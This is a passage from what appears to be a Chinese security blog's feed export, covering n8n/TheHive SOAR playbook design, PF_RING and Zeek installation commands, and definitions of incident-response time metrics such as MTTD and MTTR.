<p>A：其实这里还是考虑到可<strong>扩展性</strong>的关系，Layer2 Workflow它即要承接Layer1 Workflow的“需求”，同时也要为Layer3 Workflow提供“支撑”。所以，Layer2本身就必须有很强的扩展性，我建议你可以把它想象成编程中的“Class”。</p>
</li>
<li><p>Q：编写Workflow有什么参考规范吗？</p>
<p>A：编写Workflow并没有固定的规范，其设计完全依赖于作者的逻辑。但是，当我们将其用于事件响应（Incident Response, IR）时，我认为可以参考NIST发布的<a href="https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf">《计算机安全事件处理指南 (SP 800-61)》</a>作为框架。这将帮助我们将当前的Workflow映射到IR的各个阶段，使我们在设计Workflow时更明确其“主要职责”。如果可以每个阶段都可以设计Workflow，以便更有效地应对特定的安全事件，当然这太过于理想化。以下是各阶段的详细介绍：</p>
<ul>
<li><strong>准备阶段（Preparation）</strong>：这个阶段包括配置和维护所有必要的安全工具和系统，以便能够有效地检测和应对安全事件。这包括设置和配置SOAR工具，以便它们能够与其他安全系统（如防火墙，入侵检测系统等）集成，并且能够接收并处理威胁情报。</li>
<li><strong>检测与分析阶段（Detection &amp; Analysis）</strong>：这是威胁情报和威胁狩猎最活跃的阶段。威胁情报可以帮助你识别和了解新的或已知的威胁，而威胁狩猎则是一个主动寻找未被发现的威胁的过程。</li>
<li><strong>遏制阶段（Containment）</strong>：一旦检测到威胁，即应用预设的自动化流程去遏制威胁，例如隔离受影响的系统或阻止恶意的网络流量。</li>
<li><strong>消除阶段（Eradication）</strong>：在这个阶段，会移除系统中的威胁组件，修复漏洞并应用补丁。</li>
<li><strong>恢复阶段（Recovery）</strong>：这个阶段的目标是恢复被攻击的系统和服务，确保一切回到正常状态。</li>
<li><strong>经验总结阶段（Lessons Learned）</strong>：在应急响应结束后，应对整个事件进行回顾，总结经验教训，提升未来的应急响应效率。</li>
</ul>
</li>
</ul>
<hr>
</li>
<li><p>我通常将剧本会分为3层（Layer1 ~ Layer3），通常Layer3这一层的都是底层“打工仔”，就跟此刻的你一样。</p>
<p><img src="/2023/06/21/n8n-%E7%BC%96%E6%8E%92%E7%9A%84%E2%80%9C%E8%89%BA%E6%9C%AF%E2%80%9D/image-20230620145914433.png" alt="image-20230620145914433"></p>
<ul>
<li><p>Q：设计Layer3的Workflow时，要足够灵活且尽可能的“独立”。</p>
<p>A：灵活是指，Layer3即支持被Layer2调用，也要支持通过从HTTP API的方式进行调用，便于后期与自动化进行整合。例如，通过TheHive的Cortex调用Layer3的Workflow，它不香？独立是指：在设计Layer3的时候，需要考虑与Layer2的“亲（耦）密（合）度”，尽可能的模块化，便于其他场景的Workflow单独引用与封装。</p>
</li>
</ul>
<p><img src="/2023/06/21/n8n-%E7%BC%96%E6%8E%92%E7%9A%84%E2%80%9C%E8%89%BA%E6%9C%AF%E2%80%9D/image-20230620171551885.png" alt="image-20230620171551885"></p>
<ul>
<li><p>Q：Layer3是最后一层吗？之后会有Layer4、Layer5吗？</p>
<p>A：这完全取决于Layer3的“规模”，如果你的Layer3比较复杂，为了更加精细化管理Layer3。可以考虑新增Layer4，此时Layer3将从“底层打工人”升级成了“头号打工仔”，升职加薪，指日可待！</p>
</li>
</ul>
<p><img src="/2023/06/21/n8n-%E7%BC%96%E6%8E%92%E7%9A%84%E2%80%9C%E8%89%BA%E6%9C%AF%E2%80%9D/image-20230621000301500.png" alt="image-20230621000301500"></p>
</li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p>我认为一个“优雅”的IR Playbook框架，至少需要3层。为什么？其实，你尝试以编程的逻辑去理解它就很容易了。Layer1就是功能“入口”，Layer2则是Class，而Layer3就应该是Function。</p>
<p><img src="/2023/06/21/n8n-%E7%BC%96%E6%8E%92%E7%9A%84%E2%80%9C%E8%89%BA%E6%9C%AF%E2%80%9D/image-20230620174335657.png" alt="image-20230620174335657"></p>
</li>
<li><p>一个优秀的Playbook，像极你的老板对你的要求：“<strong>既要、又要、还要</strong>”</p>
<ul>
<li><strong>既要</strong>：具有高效的自动化流程，优化安全团队的响应时间</li>
<li><strong>又要</strong>：有灵活的设计，以便适应各种安全事件的特性</li>
<li><strong>还要</strong>：易于维护和更新，以便随着威胁场景的变化和组织需求的变化进行调整</li>
</ul>
</li>
</ul>
<p><img src="https://t12.baidu.com/it/u=1684898709,179869982&fm=30&app=106&f=JPEG?w=640&h=272&s=D5AABD5712015CE6C48964680300E072" alt="img"></p>
]]></content>
      <categories>
        <category>SOC</category>
      </categories>
      <tags>
        <tag>SIEM</tag>
        <tag>SOAR</tag>
        <tag>Thehive</tag>
        <tag>n8n</tag>
      </tags>
  </entry>
  <entry>
    <title>安装-PF_RING</title>
    <url>/2021/08/16/%E5%AE%89%E8%A3%85-PF-RING/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Installing from GIT</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/ntop/PF_RING.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kernel Module Installation</span></span><br><span class="line">$ <span class="built_in">cd</span> /opt/PF_RING/kernel</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Running PF_RING</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/kernel</span><br><span class="line">$ sudo insmod pf_ring.ko min_num_slots=65536 enable_tx_capture=0</span><br><span class="line"><span class="comment"># sudo insmod ./pf_ring.ko [min_num_slots=N] [enable_tx_capture=1|0] [ enable_ip_defrag=1|0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Drivers</span></span><br><span class="line">$ ethtool -i eth1 | grep driver</span><br><span class="line">driver: ixgbe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Libpfring and Libpcap Installation</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/lib</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ <span class="built_in">cd</span> ../libpcap</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Application Examples</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/examples</span><br><span class="line">$ make</span><br><span class="line">$ sudo ./pfcount -i zc:eth1</span><br><span class="line">$ sudo ./pfsend -f 64byte_packets.pcap -n 0 -i zc:eth1 -r 5</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/zeek/zeek</span><br><span class="line">$ ./configure --with-pcap=/opt/PF_RING --enable-jemalloc</span><br><span class="line">$ make -j4</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>NIDS</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
        <tag>NTA</tag>
      </tags>
  </entry>
  <entry>
    <title>致我心中的“散装”SOAR，当Thehive遇到n8n</title>
    <url>/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/</url>
    <content><![CDATA[<h4 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h4><p>​    2022这一年有太多琐碎的事，导致这个“作业”从2022年“成功”被我拖到了2023年。如果你和我一样，尝试用开源组件来构建一套安全运营平台，并且恰巧你也正在使用Thehive来管理日常安全运营工作，同时在寻求提升运营效率的途径。那么，我觉得这篇文章应该会对你有所帮助。</p>
<h4 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h4><p>​    由于一些历史原因，当前SIEM不仅负责多数据源的关联分析，也同时兼顾对日常告警的自动化响应。在初期团队资源有限的情况下可以用这种方式去“顶一顶”，到了后期如果你不去对功能做解耦，你的SIEM可能会变的越来越“笨重”。是的，SIEM并不擅长做自动化响应类的工作。随着时间的推移，你会发现它越来越难“胜任”这份工作。例如：</p>
<ul>
<li><p>自动化响应能力单一，无法实现复杂事件的自动化响应</p>
<p>随着，安全事件的复杂程度不断的上升，我们在很大一部分的安全事件中是无法直接“断言”并采用简单粗暴的方式进行响应。更多情况下我们需要进行一系列的研判分析后，再决定启用对应的遏制动作。</p>
</li>
<li><p>响应流程通过代码实现，维护成本较高不利于后期管理</p>
<p>由于前期是通过脚本开发的自动化响应功能，未采用Workflow（工作流）的直观展现方式。在后期不利于团队多人协作，并且对于一个新入职的小伙伴而言短期内很难维护。</p>
</li>
<li><p>SIEM平台上分析与响应耦合度太高，导致很难对SIEM功能进行扩展</p>
<p>所以，我们需要SOAR（安全编排与自动化响应）来帮助我们承接安全事件中响应侧的需求，从功能上进行“解耦”。</p>
</li>
</ul>
<hr>
<p>​    自SOAR这个概念在2017年被提出后，经过5年的迭代无论国内还是国外都已经有了相对成熟的商业产品了。商业产品的我就不过多介绍了，开源的项目介绍几个比较火的：</p>
<ul>
<li><a href="https://shuffler.io/">Shuffle</a></li>
<li><a href="https://n8n.io/">n8n</a>    本次推荐</li>
<li><a href="https://nodered.org/">Node-Red</a></li>
<li><a href="https://w5.io/#">W5</a>    国内大佬（三斤）开源的SOAR项目，必须支持！</li>
</ul>
<hr>
<h4 id="开始搬砖🚧"><a href="#开始搬砖🚧" class="headerlink" title="开始搬砖🚧"></a>开始搬砖🚧</h4><p>​    这里我使用了n8n与Thehive进行集成，这也是Thehive官方推荐的方案之一。我尝试把SIEM上的响应逻辑迁移到了n8n上，并且也顺带重新设计了响应剧本的Workflow。一个典型的SOAR剧本应聚焦在 <strong>分析</strong> 与 <strong>遏制</strong> 2个阶段上，因为只有让<strong>分析研判</strong>尽可能的全面才能更好的去支撑下一阶段的<strong>遏制</strong>。下面和大家分享一下使用了n8n作为SOAR之后的一些理解吧，欢迎大家交流！</p>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/nist-incident-response-process.png" alt="img"></p>
<h5 id="1-剧本自身要分类"><a href="#1-剧本自身要分类" class="headerlink" title="1. 剧本自身要分类"></a>1. 剧本自身要分类</h5><p>​    我们在设计剧本的时候也应当为剧本自身做好分类，这是为了便于后期更好的在其他剧本中复用这些节点。一个主剧本必然是通过不同的子剧本“组装”而来。我觉得这和写代码很像，要先把“类”抽象好，然后在下面不断的去完善“功能”。切记，不要一上来就想整一个“复杂”的剧本，尽可能的把它拆细了拆小了。</p>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230102125302449.png" alt="image-20230102125302449"></p>
<p>​    以下是我在n8n上编排的威胁情报剧本，它可以是任何一个复杂剧本的分支，支持将内容输出到TheHive，并将告警推送到Slack上。</p>
<h6 id="n8n"><a href="#n8n" class="headerlink" title="n8n"></a>n8n</h6><ul>
<li><p>主剧本</p>
<p>这里是一个Suricata alert的主剧本，将会由不同的分支子剧本共同“支撑”</p>
</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/Suricata-alert.png" alt="image-20230116181004565"></p>
<ul>
<li><p>子剧本</p>
<p>它可以是任何一个”大”剧本的分支，例如这是一个威胁情报的子剧本</p>
</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/Threat-Intelligence.png" alt="image-20230116181218577"></p>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/Intelligence-Domain.png" alt="image-20230116181542704"></p>
<h6 id="Slack"><a href="#Slack" class="headerlink" title="Slack"></a>Slack</h6><p>​    当命中威胁情报后调用Slack发送告警并升级当前Case等级</p>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230113233954354.png" alt="image-20230113233954354"></p>
<h6 id="TheHive"><a href="#TheHive" class="headerlink" title="TheHive"></a>TheHive</h6><ul>
<li>所有的分析记录与事件详情通过Thehive来汇总与呈现</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230113233840580.png" alt="image-20230113233840580"></p>
<ul>
<li>为每个响应阶段创建对应的Task</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230113235655162.png" alt="image-20230113235655162"></p>
<ul>
<li>执行结果更新到Task的logs</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230114003914196.png" alt="image-20230114003914196"></p>
<ul>
<li>将威胁情报Tags更新到observables，便于分析人员直观的了解当前IoC的信息</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230113234147771.png" alt="image-20230113234147771"></p>
<h5 id="2-内容呈现很关键"><a href="#2-内容呈现很关键" class="headerlink" title="2. 内容呈现很关键"></a>2. 内容呈现很关键</h5><p>​    对于调查取证的剧本而言，查询结果呈现非常的关键。如果SOAR运行之后无法直观的展现数据，想看详细数据还得让你去下载一个文本，这对分析人员而言并不是很友好且割裂感很强。这里我就要推荐一下Thehive了，如果你的安全事件都是推送到了Thehive上，你完全可以将输出的内容设置为<strong>Markdown</strong>格式，TheHive能够帮助你更好的呈现自动化节点输出的结果。就像下面这个示例，为了帮助分析人员缩短研判时间，现需要对威胁情报的剧本进行扩展。我们会对IP类型IoC进行PDNS的反查，将反查的域名再次与威胁情报进行匹配，并通过Shodan收集攻击者的主机信息。在这种情况下，对于数据的呈现就提出了要求。一个好的展现方式可以让分析人员更快的了解信息，反之将适得其反。</p>
<h6 id="TheHive-1"><a href="#TheHive-1" class="headerlink" title="TheHive"></a>TheHive</h6><ul>
<li>虽然查询的数据源比较多，不过通过TheHive的Markdown格式起来还算比较直观</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230114002858890.png" alt="image-20230114002858890"></p>
<h5 id="3-你的下一个剧本不应该只是“响应”"><a href="#3-你的下一个剧本不应该只是“响应”" class="headerlink" title="3. 你的下一个剧本不应该只是“响应”"></a>3. 你的下一个剧本不应该只是“响应”</h5><p>​    我们要知道当一个安全事件触发时，我们为安全事件所做的任何动作都是在”响应”这个事件。SOAR中R（Response）所指的响应，也并不只是在最后<strong>遏制</strong>的时候才叫做响应。不论哪种类型的剧本，它的目的都是为了提升安全事件的处置效率。这里建议大家千万不要觉得SOAR上的Playbook（剧本）必须都是要标配有遏制的动作。为什么这么说？是因为在一些企业中有SOP（安全事件指导手册），SOP中都会标注遏制方法或者响应措施，导致有些小伙伴认为SOAR上的剧本需要按照SOP做1:1的还原。</p>
<p>​    另外一方面在实际运营中，对于一个安全事件想要完全自动化走完剧本还是挺“艰难”的，能够被自动化走完的更多是“专项”场景，这类安全事件针对性强处理流程和模式相对固化。所以，我们在实际工作中，遇见此类告警的机率相对于还是比较少的。对此，我们应尽可能的完善分析类型的剧本，将可被“固化”的分析逻辑集成到剧本中，利用自动化提升分析的效率，也可以帮助我们规避因为分析师经验问题导致的分析“面”缺失。例如，我们可以提取Payload中需要被执行回连的IP或者Domain，并在当前网络中检索是否有对应的请求数据，从而研判这个攻击是否成功。就像之前描述的那样，这并不是一个遏制类的剧本，它是一个分析研判类的剧本，但它确实起到了效果。</p>
<h6 id="n8n-1"><a href="#n8n-1" class="headerlink" title="n8n"></a>n8n</h6><ul>
<li>Hunting Callback IoC</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/Threat_Hunting.png" alt="image-20230116191844389"></p>
<ul>
<li>子剧本</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/Hunting_Callback_Domain.png" alt="image-20230116184527491"></p>
<h6 id="TheHive-2"><a href="#TheHive-2" class="headerlink" title="TheHive"></a>TheHive</h6><ul>
<li>一旦检测到内部流量存在Callback IoC的数据则升级告警等级，反之则认为攻击并未成功，告警降级自动关闭Case。</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230114001859333.png" alt="image-20230114001859333"></p>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230114002038716.png" alt="image-20230114002038716"></p>
<ul>
<li>尽可能利用TheHive的task logs，输出有价值的信息。也许它并不能帮助你实现自动关闭Case，但是它可以帮助分析师更快的查阅已被自动化执行的结果</li>
</ul>
<p><img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230114002332982.png" alt="image-20230114002332982"></p>
<h5 id="4-对入SOAR的告警提出要求"><a href="#4-对入SOAR的告警提出要求" class="headerlink" title="4. 对入SOAR的告警提出要求"></a>4. 对入SOAR的告警提出要求</h5><p>​    如果我们想要用好SOAR，就应当对入SOAR的告警提出要求。首先我们得确保入库告警的质量，如果你的告警本身置信度就不高，我相信SOAR在这并不能帮助你什么。SOAR本身就是辅助安全运营，所以本质对安全能力的成熟度也是有要求的。例如：</p>
<ul>
<li>企业自身平台的自动化程度，很多时候SOAR都必须通过API调用的方式查询。例如：CMDB资产平台，很多时候我们是需要调用CMDB资产平台查询主机的业务信息、端口开放情况、安全组等。</li>
<li>本身人员的代码能力，就n8n而言，一些扩展事项还是需要通过代码实现的，至少Python、JS得会写。</li>
<li>企业自身安全能力的成熟度，如果连基础的安全能力都不具备也没有专职的安全分析人员，我建议暂且可放一放。搞搞基础建设，它不香吗？！安全运营，本身就是一个 P(无)D(限)C(循)A(环)的过程。</li>
</ul>
<hr>
<h4 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h4><p>​    对于SOAR我是这么理解的，不要“一味”的追求大（D）而（炸）全（天）的剧本，就像SIEM厂家“鼓吹”的我们有N个牛P的检测场景一样，工作中你能遇到的又有多少？对于SOAR的剧本，能够被复用就好，能够提升效率就好。不要“迷信”每个剧本都必须有“遏制”的动作，有的时候“分析研判”的剧本真的很“香”。如果你一定会去做些什么，为什么不让它自动化并且找个“好看”的地方“放”（展现）起来。</p>
<p>​    好了，就啰嗦到这吧。后面如果还有空的话会再补充，欢迎大家交流，写的不对的地方也欢迎指正。在新的一年想创建一个SOAR Playbook的社区，有没有志同道合的小伙伴一起？欢迎扫码加好友，可以一起聊一聊。</p>
<img src="/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/image-20230114004935522.png" alt="image-20230114004935522" style="zoom:25%;">

<h4 id="另外我觉得你也许还会感兴趣的文章："><a href="#另外我觉得你也许还会感兴趣的文章：" class="headerlink" title="另外我觉得你也许还会感兴趣的文章："></a>另外我觉得你也许还会感兴趣的文章：</h4><ul>
<li><a href="https://canon88.github.io/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/">致我心中的 “散装”（开源）SIEM (一)</a></li>
<li><a href="https://canon88.github.io/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/">浅谈TheHive平台在安全运营工作中的落地</a></li>
<li><a href="https://canon88.github.io/2022/01/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B6%A3%E8%B0%88-1/">应急响应 - 你该关注哪些指标？</a></li>
</ul>
]]></content>
      <categories>
        <category>SOC</category>
      </categories>
      <tags>
        <tag>SIEM</tag>
        <tag>SOAR</tag>
        <tag>Thehive</tag>
        <tag>n8n</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应 - 你该关注哪些指标？</title>
    <url>/2022/01/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B6%A3%E8%B0%88-1/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​    回首2021年工作，主要重心是放在了安全运营上。既然负责安全运营自然也逃不开应急响应这一茬。在这个用数字“说话”的时代，那必须是要把应急响应KPI给整的明明白白的。领导们爱看，同行们也可以用来参考。</p>
<p>​    首先需要明确的一点是，我个人是不排斥数字“说话”的，前提是大家对于应急响应KPI的理解必须一致。为什么这样说？主要是避免后期在复盘的时候在KPI的时间上进行过多的“Battle”。同时也是希望大家可以真正理解这些KPI的含义，更好的去制定这些KPI。</p>
<p>​    今天这一篇文章主要就是介绍应急响应中的KPI。不过在讨论之前，还是得简单的介绍一下什么是应急响应。</p>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="什么是应急响应？"><a href="#什么是应急响应？" class="headerlink" title="什么是应急响应？"></a>什么是应急响应？</h2><p>​    “应急响应”对应的英文是“Incident Response”（IR），是一种处理安全事件、漏洞和网络威胁的结构化<strong>方法</strong>。通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的<strong>措施</strong>。</p>
<h2 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h2><p>​    应急响应流程可以参考NIST发布的<a href="%5D(https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf)"><em><strong>《计算机安全事件处理指南 (SP 800-61)》</strong></em></a>其中明确了应急响应4个阶段并细分出了6个步骤。</p>
<p><img src="/2022/01/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B6%A3%E8%B0%88-1/nist-incident-response-process-1.png" alt="img"></p>
<ul>
<li>准备阶段：人员、预案手册（Playbook）、工具；</li>
<li>检测与分析阶段：确认安全事件类型，明确事件等级；</li>
<li>遏制、根除和恢复阶段：立即止损，根据安全事件类型选择对应的遏制方法并制定恢复计划；</li>
<li>事后总结：从本次的安全事件中改进流程，并将新数据反馈到应急响应流程的准备阶段。你应该询问、调查并记录以下问题的答案：<ul>
<li>发生了什么，在什么时候？</li>
<li>事件响应小组对事件的处理情况如何？是否遵循了流程，是否足够？</li>
<li>更早地发现还需要哪些信息？</li>
<li>是否采取了任何导致损坏或阻碍恢复的错误操作？</li>
<li>如果下次发生同样的事件，我们可以采取哪些不同的做法？</li>
<li>我们能否与其他组织或其他部门更好地分享信息？</li>
<li>我们是否学会了防止类似事件再次发生的方法？</li>
<li>我们是否发现了类似事件的新预兆或迹象，以供将来观察？</li>
<li>需要哪些额外的工具或资源来帮助预防或减轻类似事件？</li>
</ul>
</li>
</ul>
<h1 id="应急响应指标"><a href="#应急响应指标" class="headerlink" title="应急响应指标"></a>应急响应指标</h1><h2 id="MTTD"><a href="#MTTD" class="headerlink" title="MTTD"></a>MTTD</h2><ul>
<li><p>什么是MTTD？</p>
<p>MTTD：平均检测时间（Mean time to detect ）。MTTD是指从系统故障到检测或告警所需的平均时间。</p>
</li>
<li><p>如何计算MTTD？</p>
<p><strong>MTTD = 故障与检测之间的总时间/事件数量</strong></p>
<p><strong>例如：</strong>某系统在12:00发生故障，但直到12:10才有人注意到或被提醒，那么此时MTTD是10分钟。</p>
</li>
</ul>
<h2 id="MTTA"><a href="#MTTA" class="headerlink" title="MTTA"></a>MTTA</h2><ul>
<li><p>什么是MTTA？</p>
<p>MTTA：平均确认时间（Mean time to acknowledge）。MTTA是指从系统产生告警到人员开始注意并处理的平均时间。</p>
</li>
<li><p>如何计算MTTA？</p>
<p><strong>MTTA = 检测与确认之间的总时间/事件数量</strong></p>
<p><strong>例如：</strong>安全组件在12:10检测并发送告警后，应急响应人员在12:15开始处理该事件。那么此时MTTA是5分钟。</p>
</li>
</ul>
<h2 id="MTTI"><a href="#MTTI" class="headerlink" title="MTTI"></a>MTTI</h2><ul>
<li><p>什么是MTTI？</p>
<p>MTTI：平均调查时间（Mean time to investigate）。MTTI是指从确认一个安全事件到开始调查其原因和解决方案的平均时间。</p>
</li>
<li><p>如何计算MTTI？</p>
<p><strong>MTTI = 确认告警与分析调查之间的总时间/事件数量</strong></p>
<p><strong>例如：</strong>某安全运营人员在12:15开始处理告警并在12:30完成初步分析及拟定止损方案。那么此时MTTI是15分钟。</p>
</li>
</ul>
<h2 id="MTTC"><a href="#MTTC" class="headerlink" title="MTTC"></a>MTTC</h2><ul>
<li><p>什么是MTTC？</p>
<p>MTTC：平均遏制时间（Mean Time to contain）。MTTC是指安全团队找到威胁者并阻止他们进一步进入你的系统和网络所需的时间。</p>
</li>
<li><p>如何计算MTTC？</p>
<p><strong>MTTC = 分析调查与快速止损之间的总时间/事件数量</strong></p>
<p><strong>例如</strong>：自安全事件在12:10被检测到后，应急响应人员在12:45成功遏制了攻击者的利用方式并阻断了通讯隧道，有效地防止攻击者进行下一步入侵。</p>
<p><strong>注意：</strong>遏制可能是隔离一个电子邮件账户，重设一个用户密码，或关闭一个服务器。遏制是走向恢复的第一步。应急响应团队越快遏制住威胁行为者，越能降低企业受到更大风险的可能性。</p>
</li>
</ul>
<h2 id="MTTR"><a href="#MTTR" class="headerlink" title="MTTR"></a>MTTR</h2><p>​    <strong>MTTR</strong>有4种不同的测量方法，这是由于<strong>R</strong>可以代表修复（repair）、恢复（recovery/restore）、响应（respond）和解决（resolve）。虽然这4个指标有重叠，但它们都有各自的含义和细微差别。安全人员通常关注的是<strong>平均响应时间</strong>这个指标。</p>
<ul>
<li><p>平均修复时间（Mean time to repair）</p>
<ul>
<li><p>什么是MTTR（平均修复时间）？</p>
<p>MTTR是修复一个系统的平均时间。它包括维修时间和测试时间，直到系统再次完全运作。</p>
</li>
<li><p>如何计算MTTR（平均修复时间）？</p>
<p><strong>MTTR = 将修复时间与恢复时间相加/修复次数</strong></p>
<p><strong>例如：</strong>一周内有10次停电，修复系统花费了4个小时。四个小时是240分钟。240除以10是24。这意味着在这种情况下，修复的平均时间是24分钟。</p>
<p><strong>注意</strong>：平均修复时间并不总是与系统中断本身的时间相同。在某些情况下，修复这个动作是在产品故障或系统中断后的几分钟内开始。</p>
</li>
</ul>
</li>
<li><p>平均恢复时间（Mean time to recovery/restore）</p>
<ul>
<li><p>什么是MTTR（平均恢复时间）？</p>
<p>MTTR（平均恢复时间）是指从产品或系统故障中恢复的平均时间。这包括从系统或产品发生故障到其重新完全运作的整个中断时间。</p>
</li>
<li><p>如何计算MTTR（平均恢复时间）？</p>
<p><strong>MTTR = 将故障时间与恢复时间相加/故障数量</strong></p>
<p><strong>例如：</strong>我们的系统在24小时内在两个独立事件中停机了30分钟。30除以2是15，所以我们的MTTR是15分钟。</p>
<p><strong>注意：</strong>这个指标它包括故障现象出现到告警发出的这段延迟时间与respond有着明显的区别。</p>
</li>
</ul>
</li>
<li><p>平均解决时间（Mean time to resolve）</p>
<ul>
<li><p>什么是MTTR（平均解决时间）？</p>
<p>MTTR（平均解决时间）是指完全解决一个故障所需的平均时间。这不仅包括检测故障、诊断问题和修复问题的时间，还包括确保故障不会再次发生的时间。<strong>这个指标代表从“救火”到“防火”的转变。</strong></p>
</li>
<li><p>如何计算MTTR（平均解决时间）？</p>
<p><strong>MTTR = 将故障时间与完全解决之间的时间相加/故障数量</strong></p>
<p><strong>例如：</strong>你的系统在24小时内的一次事件中总共瘫痪了两个小时，而团队又花了两个小时进行修复，以确保系统中断不会再次发生，这就是解决该问题的总时间。这意味着你的MTTR是四个小时。</p>
<p><strong>注意：</strong>MTTR 最常使用工作时间（8小时）计算（假设你在下班时将故障恢复，并在第二天上班时解决潜在问题，那么你的 MTTR 将不包括下班的16小时）。如果你的团队在能够7X24小时，或者有值班员工在下班后工作，那么这个指标将可以进行适当的微调。</p>
</li>
</ul>
</li>
<li><p>平均响应时间（Mean time to respond）</p>
<ul>
<li><p>什么是MTTR（平均响应时间）？</p>
<p>MTTR（平均响应时间）是指从第一次收到警报时起，直到产品或系统从故障中恢复所需的平均时间。</p>
</li>
<li><p>如何计算MTTR（平均响应时间）？</p>
<p><strong>MTTR = 检测告警与服务恢复之间的总时间/事件数量</strong></p>
<p><strong>示例：</strong>如果你在一个40小时的工作周里发生了四起事件，并且在这些事件上总共花了一个小时（从警报到恢复），那么你那一周的MTTR将是15分钟。</p>
<p><strong>注意：</strong>平均响应时间不考虑问题已经存在但未被识别的时间。</p>
</li>
</ul>
</li>
</ul>
<h1 id="举个“栗子”"><a href="#举个“栗子”" class="headerlink" title="举个“栗子”"></a>举个“栗子”</h1><p><strong>应急响应KPI时间线</strong></p>
<p><img src="/2022/01/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B6%A3%E8%B0%88-1/IR-KPI.png" alt="image-20220208010258629"></p>
<ol>
<li><strong>MTTD：</strong>告警群在12:05上报一起安全告警，（假设告警每5分钟同步一次到群里，理想情况下告警应近乎实时）。MTTD：5分钟（<em>12:05 - 12:00 = 5</em>）</li>
<li><strong>MTTA：</strong>安全运营团队在12:10开始处理此告警并确认这是一起真实的网络入侵事件，同一时间应急响应团队介入。MTTA：5分钟（<em>12:10 - 12:05 = 5</em>）</li>
<li><strong>MTTI：</strong>应急响应团队在12:25完成初步分析并根据已有应急预案拟定遏制方案。MTTI：15分钟（<em>12:25 - 12:10 = 15</em>）</li>
<li><strong>MTTC：</strong>根据预案安全运营团队在12:35完成了安全组件的规则调整，并删除已识别的后门木马遏制了攻击者的利用“路径”。为后续的根除威胁争取到了充足的时间。MTTC：30分钟（<em>12:35 - 12:05 = 30</em>）</li>
<li><strong>MTTR：</strong>12:50正式通知重新上线业务恢复对外服务。MTTR（Respond）：45分钟（<em>12:50 - 12:05 = 45</em>）、MTTR（Recovery）：50分钟（<em>12:50 - 12:00 = 50</em>）；</li>
</ol>
]]></content>
      <categories>
        <category>SOC</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>安全运营</tag>
      </tags>
  </entry>
  <entry>
    <title>我在&#39;云&#39;上的日子 - Suricata(部署)</title>
